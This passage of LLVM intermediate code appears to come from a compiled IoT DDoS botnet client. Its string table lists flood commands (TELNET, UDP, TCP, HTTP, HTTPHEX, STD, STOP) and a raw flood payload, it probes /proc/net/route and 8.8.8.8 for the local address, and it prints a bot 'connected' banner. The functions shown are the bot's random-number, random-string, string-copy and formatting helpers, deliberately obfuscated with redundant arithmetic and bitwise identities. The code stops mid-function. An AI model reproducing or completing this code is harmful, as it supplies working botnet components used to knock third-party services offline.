@.str.127 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@.str.128 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.129 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.130 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.132 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.133 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.134 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.135 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.136 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.137 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.138 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.139 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.142 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.143 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.145 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.146 = private unnamed_addr constant [134 x i8] c"\1B[0;97m[ \1B[0;91mExecution \1B[0;97m] [ \1B[0;91m%s\1B[0;97m ] Connected -> \1B[0;91m%s\1B[0;97m  | Endian \1B[0;91m%s  \1B[0;97m| Device: \1B[0;91m%s\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i32 0, i32 0), i32 0) #3
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:9:                                      ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i32 0, i32 0), i32 0) #3
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:13:                                     ; preds = %9
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:14:                                     ; preds = %13, %12, %8, %4
  %15 = load i8*, i8** %1, align 8
  ret i8* %15
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 %5, 1366145255
  %7 = add i32 %6, -1640531527
  %8 = add i32 %7, 1366145255
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1640531527
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add i32 %10, -1640531527
  %16 = sub i32 0, -1640531527
  %17 = sub i32 %14, %16
  %18 = add i32 %14, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %71, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %78

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = add i32 %23, -962956200
  %25 = sub i32 %24, 3
  %26 = sub i32 %25, -962956200
  %27 = sub nsw i32 %23, 3
  %28 = sext i32 %26 to i64
  %29 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %28
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1047004753
  %33 = sub i32 %32, 2
  %34 = sub i32 %33, 1047004753
  %35 = sub nsw i32 %31, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %30, -1
  %40 = and i32 -10381785, %39
  %41 = xor i32 -10381785, -1
  %42 = and i32 %30, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, -10381785
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %30, %38
  %50 = xor i32 %48, -1
  %51 = and i32 -1640531527, %50
  %52 = xor i32 -1640531527, -1
  %53 = and i32 %48, %52
  %54 = or i32 %51, %53
  %55 = xor i32 %48, -1640531527
  %56 = load i32, i32* %3, align 4
  %57 = xor i32 %54, -1
  %58 = and i32 -694244926, %57
  %59 = xor i32 -694244926, -1
  %60 = and i32 %54, %59
  %61 = xor i32 %56, -1
  %62 = and i32 %61, -694244926
  %63 = and i32 %56, %59
  %64 = or i32 %58, %60
  %65 = or i32 %62, %63
  %66 = xor i32 %64, %65
  %67 = xor i32 %54, %56
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %69
  store i32 %66, i32* %70, align 4
  br label %71

; <label>:71:                                     ; preds = %22
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  store i32 %76, i32* %3, align 4
  br label %19

; <label>:78:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, 1
  %7 = sub i32 %5, %6
  %8 = add i32 %5, 1
  %9 = xor i32 4095, -1
  %10 = xor i32 %7, %9
  %11 = and i32 %10, %7
  %12 = and i32 %7, 4095
  store i32 %11, i32* @rand_cmwc.i, align 4
  %13 = load i64, i64* %2, align 8
  %14 = load i32, i32* @rand_cmwc.i, align 4
  %15 = zext i32 %14 to i64
  %16 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = zext i32 %17 to i64
  %19 = mul i64 %13, %18
  %20 = load i32, i32* @c, align 4
  %21 = zext i32 %20 to i64
  %22 = sub i64 0, %19
  %23 = sub i64 0, %21
  %24 = add i64 %22, %23
  %25 = sub i64 0, %24
  %26 = add i64 %19, %21
  store i64 %25, i64* %1, align 8
  %27 = load i64, i64* %1, align 8
  %28 = lshr i64 %27, 32
  %29 = trunc i64 %28 to i32
  store i32 %29, i32* @c, align 4
  %30 = load i64, i64* %1, align 8
  %31 = load i32, i32* @c, align 4
  %32 = zext i32 %31 to i64
  %33 = add i64 %30, -3028706884995477323
  %34 = add i64 %33, %32
  %35 = sub i64 %34, -3028706884995477323
  %36 = add i64 %30, %32
  %37 = trunc i64 %35 to i32
  store i32 %37, i32* %3, align 4
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @c, align 4
  %40 = icmp ult i32 %38, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %0
  %42 = load i32, i32* %3, align 4
  %43 = sub i32 %42, -1691518325
  %44 = add i32 %43, 1
  %45 = add i32 %44, -1691518325
  %46 = add i32 %42, 1
  store i32 %45, i32* %3, align 4
  %47 = load i32, i32* @c, align 4
  %48 = sub i32 0, 1
  %49 = sub i32 %47, %48
  %50 = add i32 %47, 1
  store i32 %49, i32* @c, align 4
  br label %51

; <label>:51:                                     ; preds = %41, %0
  %52 = load i32, i32* %4, align 4
  %53 = load i32, i32* %3, align 4
  %54 = add i32 %52, 1866010717
  %55 = sub i32 %54, %53
  %56 = sub i32 %55, 1866010717
  %57 = sub i32 %52, %53
  %58 = load i32, i32* @rand_cmwc.i, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %59
  store i32 %56, i32* %60, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #3
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #3
  %4 = call i32 @getppid() #3
  %5 = xor i32 %3, -1
  %6 = and i32 %4, %5
  %7 = xor i32 %4, -1
  %8 = and i32 %3, %7
  %9 = or i32 %6, %8
  %10 = xor i32 %3, %4
  store i32 %9, i32* @y, align 4
  %11 = call i64 @clock() #3
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* @z, align 4
  %13 = load i32, i32* @z, align 4
  %14 = load i32, i32* @y, align 4
  %15 = xor i32 %13, -1
  %16 = and i32 720783810, %15
  %17 = xor i32 720783810, -1
  %18 = and i32 %13, %17
  %19 = xor i32 %14, -1
  %20 = and i32 %19, 720783810
  %21 = and i32 %14, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %13, %14
  store i32 %24, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 -440527871, %15
  %17 = xor i32 -440527871, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, -440527871
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 791925510, %32
  %34 = xor i32 791925510, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, 791925510
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 1898794860, %45
  %47 = xor i32 1898794860, -1
  %48 = and i32 %44, %47
  %49 = xor i32 %43, -1
  %50 = and i32 %49, 1898794860
  %51 = and i32 %43, %47
  %52 = or i32 %46, %48
  %53 = or i32 %50, %51
  %54 = xor i32 %52, %53
  %55 = xor i32 %44, %43
  store i32 %54, i32* @w, align 4
  %56 = load i32, i32* @w, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %68, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %69

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %23

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 0, 4
  %20 = add i64 %18, %19
  %21 = sub i64 %18, 4
  %22 = trunc i64 %20 to i32
  store i32 %22, i32* %4, align 4
  br label %68

; <label>:23:                                     ; preds = %8
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  br i1 %25, label %26, label %48

; <label>:26:                                     ; preds = %23
  %27 = call i32 @rand_next()
  %28 = xor i32 %27, -1
  %29 = xor i32 65535, -1
  %30 = xor i32 -2053436320, -1
  %31 = or i32 %28, %29
  %32 = or i32 -2053436320, %30
  %33 = xor i32 %31, -1
  %34 = and i32 %33, %32
  %35 = and i32 %27, 65535
  %36 = trunc i32 %34 to i16
  %37 = load i8*, i8** %3, align 8
  %38 = bitcast i8* %37 to i16*
  store i16 %36, i16* %38, align 2
  %39 = load i8*, i8** %3, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 2
  store i8* %40, i8** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %42, 6005062456799443926
  %44 = sub i64 %43, 2
  %45 = add i64 %44, 6005062456799443926
  %46 = sub i64 %42, 2
  %47 = trunc i64 %45 to i32
  store i32 %47, i32* %4, align 4
  br label %67

; <label>:48:                                     ; preds = %23
  %49 = call i32 @rand_next()
  %50 = xor i32 %49, -1
  %51 = xor i32 255, -1
  %52 = xor i32 -585954268, -1
  %53 = or i32 %50, %51
  %54 = or i32 -585954268, %52
  %55 = xor i32 %53, -1
  %56 = and i32 %55, %54
  %57 = and i32 %49, 255
  %58 = trunc i32 %56 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* %4, align 4
  %62 = sub i32 0, %61
  %63 = sub i32 0, -1
  %64 = add i32 %62, %63
  %65 = sub i32 0, %64
  %66 = add nsw i32 %61, -1
  store i32 %65, i32* %4, align 4
  br label %67

; <label>:67:                                     ; preds = %48, %26
  br label %68

; <label>:68:                                     ; preds = %67, %11
  br label %5

; <label>:69:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %66, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %67

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %54

; <label>:15:                                     ; preds = %11
  %16 = call i32 @rand_next()
  store i32 %16, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = icmp ult i64 %19, 4
  br i1 %20, label %21, label %47

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %6, align 4
  %23 = xor i32 255, -1
  %24 = xor i32 %22, %23
  %25 = and i32 %24, %22
  %26 = and i32 %22, 255
  %27 = trunc i32 %25 to i8
  store i8 %27, i8* %7, align 1
  %28 = load i32, i32* %6, align 4
  %29 = lshr i32 %28, 8
  store i32 %29, i32* %6, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i32
  %32 = ashr i32 %31, 3
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %7, align 1
  %34 = load i8, i8* %7, align 1
  %35 = zext i8 %34 to i64
  %36 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %3, align 8
  store i8 %37, i8* %38, align 1
  br label %40

; <label>:40:                                     ; preds = %21
  %41 = load i32, i32* %5, align 4
  %42 = sub i32 0, %41
  %43 = sub i32 0, 1
  %44 = add i32 %42, %43
  %45 = sub i32 0, %44
  %46 = add nsw i32 %41, 1
  store i32 %45, i32* %5, align 4
  br label %17

; <label>:47:                                     ; preds = %17
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = sub i64 0, 4
  %51 = add i64 %49, %50
  %52 = sub i64 %49, 4
  %53 = trunc i64 %51 to i32
  store i32 %53, i32* %4, align 4
  br label %66

; <label>:54:                                     ; preds = %11
  %55 = call i32 @rand_next()
  %56 = zext i32 %55 to i64
  %57 = urem i64 %56, 32
  %58 = trunc i64 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* %4, align 4
  %62 = add i32 %61, 511397405
  %63 = add i32 %62, -1
  %64 = sub i32 %63, 511397405
  %65 = add nsw i32 %61, -1
  store i32 %64, i32* %4, align 4
  br label %66

; <label>:66:                                     ; preds = %54, %47
  br label %8

; <label>:67:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  store i32 %13, i32* %3, align 4
  br label %4

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* %3, align 4
  ret i32 %16
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %18, %3
  %12 = load i32, i32* %6, align 4
  %13 = add i32 %12, 772106213
  %14 = add i32 %13, -1
  %15 = sub i32 %14, 772106213
  %16 = add nsw i32 %12, -1
  store i32 %15, i32* %6, align 4
  %17 = icmp ne i32 %12, 0
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %11
  %19 = load i8*, i8** %8, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %8, align 8
  %21 = load i8, i8* %19, align 1
  %22 = load i8*, i8** %7, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %7, align 8
  store i8 %21, i8* %22, align 1
  br label %11

; <label>:24:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %12)
  %14 = load i32, i32* %5, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, 1
  %37 = sub i32 %35, %36
  %38 = add nsw i32 %35, 1
  store i32 %37, i32* %8, align 4
  br label %9

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %39
  br label %45

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %4, align 8
  br label %45

; <label>:45:                                     ; preds = %43, %42
  %46 = phi i8* [ null, %42 ], [ %44, %43 ]
  ret i8* %46
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %330, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %333

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %318

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %333

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %319

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
